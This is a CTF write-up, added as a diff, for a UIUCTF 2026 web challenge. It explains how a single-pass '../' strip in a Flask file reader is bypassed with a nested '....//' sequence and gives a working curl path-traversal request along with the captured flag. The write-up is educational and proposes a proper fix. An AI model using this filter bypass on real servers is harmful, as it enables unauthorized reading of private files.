@@ -1,0 +1,108 @@
+---
+title: 'UIUCTF 2026 - CaveFilePaths'
+description: 'Slipping past a single non-recursive ../ strip with a nested ....// sequence to read a file outside the served directory'
+date: 2026-08-09
+tags: ['writeup', 'web', 'path-traversal', 'lfi', 'filter-bypass', 'uiuctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+> Deep beneath the mountain lies the Sword of Mastery. The cave keeper left a
+> small file reader and several public notes, but the treasure chest is hidden
+> off the marked trail. Can you find the path to it?
+>
+> Challenge URL: https://cave-file-paths.chal.uiuc.tf/
+
+The handout is a small Flask app: `app.py`, a `cave_files/` directory with three
+public notes, an empty `private/` directory, and the `Dockerfile` and
+`entrypoint.sh` that build it.
+
+## Source Code Analysis
+
+The whole attack surface is one route:
+
+```python
+BASE_DIR = Path(__file__).resolve().parent
+PUBLIC_CAVE_DIR = BASE_DIR / "cave_files"
+
+
+@app.get("/read")
+def read_cave_file():
+    filename = request.args.get("file", "torch.txt")
+
+    if os.path.isabs(filename):
+        abort(400, description="The cave map only understands relative paths.")
+
+    filename = filename.replace("../", "")
+    requested_path = PUBLIC_CAVE_DIR / filename
+
+    if not requested_path.is_file():
+        abort(404, description="That passage does not seem to exist.")
+
+    return send_file(requested_path, mimetype="text/plain")
+```
+
+Two defenses: absolute paths are rejected, and `../` is stripped. Everything
+else is joined onto `cave_files/` and sent back.
+
+`entrypoint.sh` says where the flag lands — in the sibling `private/` directory,
+not under `cave_files/`:
+
+```bash
+printf 'The ancient chest opens. Inside rests the Sword of Mastery.\n\n%s\n' "$FLAG_VALUE" > /app/private/secret_chest.txt
+```
+
+So one directory level up from `cave_files/` is exactly what is needed, and one
+directory level up is exactly what the filter removes.
+
+## The Vulnerability
+
+`str.replace` performs a single left-to-right pass and does not re-scan the text
+it has already produced. The filter therefore removes the `../` sequences
+present in the *input*, not the ones present in the *output*.
+
+Feed it `....//` and it finds one `../` in the middle, deletes it, and the two
+halves it leaves behind join into a fresh `../` that never gets examined:
+
+```text
+"....//"  ->  ".." + "/"  ->  "../"
+```
+
+The public note in `cave_files/torch.txt` is a nudge at the same idea:
+
+```text
+The torch flickers against the cave wall.
+
+A scratched warning reads:
+"The marked trail is safe, but the oldest treasures were hidden one passage away."
+```
+
+## Exploitation
+
+One request, no tooling:
+
+```bash
+curl 'https://cave-file-paths.chal.uiuc.tf/read?file=....//private/secret_chest.txt'
+```
+
+The filter turns `....//private/secret_chest.txt` into
+`../private/secret_chest.txt`, which `PUBLIC_CAVE_DIR /` resolves to
+`/app/private/secret_chest.txt`:
+
+```text
+The ancient chest opens. Inside rests the Sword of Mastery.
+
+uiuctf{path_traversal_opens_the_chest}
+```
+
+The fix is to resolve the joined path and check that it is still inside the
+served directory, rather than trying to scrub the input — a filter that rewrites
+its input has to be run to a fixed point to mean anything.
+
+## Flag
+
+```text
+uiuctf{path_traversal_opens_the_chest}
+```
